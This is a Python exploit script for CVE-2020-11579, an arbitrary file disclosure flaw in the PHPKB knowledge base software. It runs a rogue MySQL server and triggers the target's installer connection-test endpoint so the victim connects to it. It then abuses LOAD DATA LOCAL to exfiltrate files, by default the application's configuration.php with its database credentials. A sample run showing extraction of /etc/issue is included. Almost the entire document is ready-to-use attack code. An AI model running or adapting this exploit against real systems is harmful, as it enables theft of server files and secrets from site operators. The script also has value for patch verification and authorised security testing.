#!/usr/bin/env python
# coding: utf8
#
# this script exploits CVE-2020-11579, an arbitrary file 
# disclosure through a MySQL client in 
# PHPKB (https://www.knowledgebase-script.com/).
#
# usage: $CVE-2020-11579.py [-h] [-rh RHOST] -lh LHOST [-lp LPORT] [-f FILE]
#                             [-s] [-d] [-o OUTPUT_FILE]
# 
# optional arguments:
#   -h, --help            show this help message and exit
#   -rh RHOST, --rhost RHOST
#                         remote PHPKB webroot, e.g.:
#                         http://10.10.10.11:8080/phpkbv9
#   -lh LHOST, --lhost LHOST
#                         local host ip/hostname to expose the rogue mysql
#                         server at
#   -lp LPORT, --lport LPORT
#                         local port to expose the rogue mysql server at
#   -f FILE, --file FILE  remote file to exfiltrate, web root is at ../../
#   -s, --server-only     start rogue mysql server and wait
#   -d, --debug           enable debug mode
#   -o OUTPUT_FILE, --output-file OUTPUT_FILE
#                        save exfiltrated file to path
# example run:
# $ ./CVE-2020-11579.py -rh http://192.168.252.130 -lh 0.0.0.0 -f '/etc/issue' -lp 3308 -d
# 2020-03-17 06:22:22,796 - INFO - triggering mysql connection...
# 2020-03-17 06:22:23,804 - INFO - new connection from 192.168.252.130:55628:
# 2020-03-17 06:22:23,804 - DEBUG - server -> client: (Server Greeting)
# 0000 50 00 00 00 0a 35 2e 31 2e 36 36 2d 30 2b 73 71 P....5.1.66-0+sq
# 0000 75 65 65 7a 65 31 00 36 00 00 00 31 32 33 34 35 ueeze1.6...12345
# 0000 36 37 38 00 df f7 08 02 00 00 00 15 00 00 00 00 678.............
# 0030 00 00 00 00 00 00 77 68 61 74 65 76 65 72 00 6d ......whatever.m
# 0040 79 73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 73 ysql_native_pass
# 0050 77 6f 72 64                                     word
# 2020-03-17 06:22:23,805 - DEBUG - client -> server: (len)
# 0000 55 00 00                                        U..
# 2020-03-17 06:22:23,805 - DEBUG - client -> server: (data)
# 0000 01 8d a2 0a 00 00 00 00 c0 08 00 00 00 00 00 00 ................
# 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
# 0000 00 74 65 73 74 00 14 fe 23 45 40 fd 5b 09 3e c8 .test...#E@.[.>.
# 0030 37 69 3b b0 c8 f8 9b fb 44 a0 0f 74 65 73 74 00 7i;.....D..test.
# 0040 6d 79 73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 mysql_native_pas
# 0050 73 77 6f 72 64 00                               sword.
# 2020-03-17 06:22:23,805 - INFO - received login info and client capabilities ^
# 2020-03-17 06:22:23,805 - INFO - client has LOAD DATA LOCAL bit set (good)
# 2020-03-17 06:22:23,805 - DEBUG - server -> client: (Response OK)
# 0000 07 00 00 02 00 00 00 02 00 00 00                ...........
# 2020-03-17 06:22:23,805 - INFO - fake authentication finished
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (len)
# 0000 0f 00 00                                        ...
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (data)
# 0000 00 03 53 45 54 20 4e 41 4d 45 53 20 75 74 66 38 ..SET NAMES utf8
# 2020-03-17 06:22:23,806 - INFO - received Request Query (this is going to be ignored) ^
# 2020-03-17 06:22:23,806 - DEBUG - server -> client: (file request / response TABULAR)
# 0000 0b 00 00 01 fb 2f 65 74 63 2f 69 73 73 75 65    ...../etc/issue
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (len)
# 0000 1a 00 00                                        ...
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (data)
# 0000 02 55 62 75 6e 74 75 20 31 36 2e 30 34 2e 36 20 .Ubuntu 16.04.6
# 0000 4c 54 53 20 5c 6e 20 5c 6c 0a 0a                LTS \n \l..
# 2020-03-17 06:22:23,806 - INFO - received file contents ^
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (len)
# 0000 00 00 00                                        ...
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (data)
# 0000 03                                              .
# 2020-03-17 06:22:23,807 - DEBUG - server -> client: (Response OK)
# 0000 07 00 00 04 00 00 00 02 00 00 00                ...........
# 2020-03-17 06:22:23,807 - INFO - file exfiltration finished
# 2020-03-17 06:22:23,807 - CRITICAL - Successfully extracted file from 192.168.252.130:55628:
# Ubuntu 16.04.6 LTS \n \l
#
#
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (len)
# 0000 01 00 00                                        ...
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (data)
# 0000 00 01                                           ..
# 2020-03-17 06:22:23,807 - INFO - received request command quit ^
# 2020-03-17 06:22:23,807 - DEBUG - server -> client: (quitting)
# 0000 00                                              .
# 2020-03-17 06:22:23,809 - INFO - mySQL connection successfully triggered
# 2020-03-17 06:22:23,809 - INFO - stopping the server...
# $
#
# tested on:
#   Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
#   Apache/2.4.18 (Ubuntu)
#   PHP Version 5.6.40-24+ubuntu16.04.1+deb.sury.org+1
#   mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $
#
#   Windows NT WIN-S4KI67792EN 10.0 build 17763 (Windows Server 2016) i586
#   Microsoft IIS 10.0
#   PHP Version 5.6.31
#   mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $
# 
# this script is based on the original rogue server
# https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py 
# -- thanks @Gifts!
#
# polict, 10/03/2020

# mysql server requirements
import threading
import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers
import time

# http request trigger requirements
import requests, sys
from argparse import ArgumentParser
requests.packages.urllib3.disable_warnings()

# default settings
DEFAULT_FILE = "../../admin/include/configuration.php"
DEFAULT_PORT = 3306

class LastPacket(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 
            0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, 
            payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

def can_client_use_load_data_local(mysql_packet):
    # \x05\xa6... -> \xa6\x05
    client_caps = mysql_packet[:2][::-1]
    client_caps = int(client_caps.encode('hex'), 16)
    # from https://dev.mysql.com/doc/internals/en/capability-flags.html
    return ((client_caps & 0x80) == 0x80)

def is_character_printable(s):
  # check if char is printable
  return all((ord(c) < 127) and (ord(c) >= 32) for c in s)

def hexdump(packet):
    ascii_string = ""
    memory_address = 0
    hexdump_string = ""
    for byte in str(packet):
        ascii_string = ascii_string + \
            (byte if is_character_printable(byte) else '.')
        if memory_address%16 == 0:
            # add address
            hexdump_string += format(memory_address, '04X') + " "
            hexdump_string += byte.encode('hex') + " "
        elif memory_address%16 == 15:
            hexdump_string += byte.encode('hex') + " "
            # add ascii chars
            hexdump_string += ascii_string + "\n"
            ascii_string = ""
        else:
            hexdump_string += byte.encode('hex') + " "
        memory_address = memory_address + 1

    # check if last line is not full
    if len(ascii_string) > 0:
        # append spaces to be aligned
        hexdump_string += ' ' * (70 - (len(hexdump_string) % 70) - 17)
        # append remaining ascii chars
        hexdump_string += ascii_string
    return hexdump_string.rstrip("\n")

class tcp_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.extracted_file = []
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',                     # Protocol
                    '5.1.66-0+squeeze1' + '\0', # server version
                    '\x36\x00\x00\x00',         # Thread ID
                    '12345678' + '\0',          # Salt
                    '\xdf\xf7',                 # Capabilities
                    '\x08',                     # Collation: latin1_swedish_ci
                    '\x02\x00',                 # Server Status
                    '\x00\x00',                 # extended server capabilities, 
                                                # works with mysqlnd 5.0.11-dev - 20120503
                                                # other clients might be picky:
                                                #   - '\xff\xc1' works for mysql workbench Ver 8.0.19 for Win64 on x86_64
                                                #   - '\xf7\x80' works in recent mysql clients
                    '\x15',                     # auth plugin length
                    '\x00' * 10,                # unused
                    'whatever' + '\0',          # salt
                    'mysql_native_password'     # auth plugin
                ))
            ), "Server Greeting"
        )

    def push(self, data, label="?"):
        log.debug('server -> client: (%s)\n%s', label, hexdump(data))
        data = str(data)
        asynchat.async_chat.push(self, data)

    def send_response_ok(self, packet):
        self.push(mysql_packet(
                packet, '\0\0\0\x02\0\0\0'
            ), "Response OK")

    def collect_incoming_data(self, data):
        if len(data) == 3:
            log.debug('client -> server: (len)\n%s', hexdump(data))
        else:
            log.debug('client -> server: (data)\n%s', hexdump(data))
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        # we read the length first
        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'

        # special case if packet len >= 65536 bytes
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push('\x00', "closing socket")
                self.close_when_done()
            else:
                self.state = 'Data'

        # actual mysql packet payload
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('received Request Query (this is going to be ignored) ^')

                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(args.file)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET,"file request / response TABULAR")
                    elif packet.payload == '\x01':
                        log.info("received request command quit ^")
                        self.push('\x00', 'quitting')
                        self.close_when_done()
                    else:
                        pass
                else:
                    if self.sub_state == 'File':
                        if len(data) == 1:
                            self.send_response_ok(packet)
                            log.info("file exfiltration finished")

                            if len(self.extracted_file):
                                log.critical("Successfully extracted file from {}:{}:\n{}".format(
                                    self.addr[0], self.addr[1], ''.join(self.extracted_file)))
                                if args.output_file is not None:
                                    try:
                                        with open(args.output_file, 'wb') as f:
                                            f.write(''.join(self.extracted_file))
                                        log.info("extracted file saved to %s", args.output_file)
                                    except Exception as e:
                                        log.error("Error while trying to save exfiltrated file: %s", e)
                            else:
                                log.critical("file extraction failed (check in debug mode with -d)")

                            self.extracted_file = []
                            raise LastPacket()
                        else:
                            log.info('received file contents ^')
                            # append to exfiltrated file
                            self.extracted_file += data[1:]

                            self.set_terminator(3)
                            self.state = 'LEN'
                    elif self.sub_state == 'Auth':
                        log.info('received login info and client capabilities ^')
                        if can_client_use_load_data_local(packet.payload) is False:
                            log.critical("Target client has LOAD DATA LOCAL bit NOT set \
                                -- exploit will probably fail...")
                        else:
                            log.info('client has LOAD DATA LOCAL bit set (good)')
                        self.send_response_ok(packet)
                        log.info("fake authentication finished")
                        raise LastPacket()
                    else:
                        log.warning("??? couldn't recognize state ???")
                        raise ValueError('Unknown packet')
            except LastPacket:
                # once we finish every state (e.g.: authentication, file exfiltration, ...)
                # we reset the packet reader to continue with the next one
                self.state = 'LEN'
                self.sub_state = None
                self.set_terminator(3)
        else:
            log.error('Unknown state')
            self.push('\x00')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    global args
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind((args.lhost, args.lport))
            except socket.error, e:
                log.error("Error while binding to local port: {}".format(e))
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info("new connection from {}:{}".format(pair[1][0], pair[1][1]))
            tmp = tcp_request_handler(pair)

class exploit_listener(object):
    def __init__(self):
        self.mysql = mysql_listener()
        self.thread = threading.Thread()

    def start(self):
        self.thread = threading.Thread(
            target=asyncore.loop, kwargs={'timeout': 1})
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.mysql.close()
        self.thread.join()

parser = ArgumentParser()
parser.add_argument("-rh", "--rhost", dest="rhost",
            help="remote PHPKB webroot, e.g.: http://10.10.10.11:8080/phpkbv9")
parser.add_argument("-lh", "--lhost", dest="lhost",
            help="local host ip/hostname to expose the rogue mysql server at",
            required=True)
parser.add_argument("-lp", "--lport", dest="lport",
            default=DEFAULT_PORT, help="local port to expose the rogue mysql server at",
            type=int)
parser.add_argument("-f", "--file", dest="file",
            default=DEFAULT_FILE,
            help="remote file to exfiltrate, web root is at ../../")
parser.add_argument("-s", "--server-only", dest="server_only",
            action="store_true",
            help="start rogue mysql server and wait")
parser.add_argument("-d", "--debug", dest="debug_mode",
            action="store_true",
            help="enable debug mode")
parser.add_argument("-o", '--output-file',dest="output_file",
            help="save exfiltrated file to path")
args = parser.parse_args()

log = logging.getLogger(__name__)
if args.debug_mode:
    log.setLevel(logging.DEBUG)
else:
    log.setLevel(logging.ERROR)

handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
log.addHandler(handler)

# start mysql rogue listener
rogue_server = exploit_listener()
rogue_server.start()

if args.server_only:
    try:
        log.critical("Evil mysql server is now listening \
on {}:{} -- CTRL-C once done".format(args.lhost, args.lport))
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        rogue_server.stop()
        exit()

if args.rhost is None:
    parser.print_help()
    exit(1)

log.info("triggering mysql connection...")
# avoid race condition
time.sleep(1)
 
# trigger file exfiltration
trigger_fe = requests.get("{}/installer/include/test-connection.php?mys={}:{}&myu=test&myp=test&myd=test".format(
    args.rhost, args.lhost, args.lport))
if trigger_fe.status_code == 200 and \
    "Connection established successfully" in trigger_fe.text:
    log.info("mySQL connection successfully triggered")

log.info("stopping the server...")
rogue_server.stop()